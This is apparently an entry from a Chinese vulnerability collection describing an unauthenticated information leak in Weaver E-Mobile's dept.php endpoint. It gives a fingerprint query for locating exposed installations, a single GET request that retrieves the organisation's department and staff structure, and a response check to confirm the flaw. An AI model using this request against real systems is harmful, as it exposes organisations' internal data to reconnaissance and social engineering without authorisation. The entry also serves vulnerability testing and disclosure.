---
source: "R4gd0ll/I-Wanna-Get-All"
---

# 泛微E-Mobile dept.php 信息泄露漏洞

## 漏洞描述

泛微 E-Mobile 的 `/E-mobile/App/System/UserSelect/dept.php` 接口存在未授权访问漏洞。该接口返回系统部门/人员组织架构信息，无需登录即可访问，攻击者可获取企业内部组织结构、部门名称等敏感信息，为社工和进一步渗透提供基础数据。

## 漏洞影响

```
泛微 E-Mobile
```

## 网络测绘

```
app="泛微-EMobile"
```

## 漏洞复现

```
GET /E-mobile/App/System/UserSelect/dept.php HTTP/1.1
```

若响应状态码为 200 且内容包含 `所有部门` 等特征字段，则漏洞存在。响应中将返回完整的部门组织架构数据。
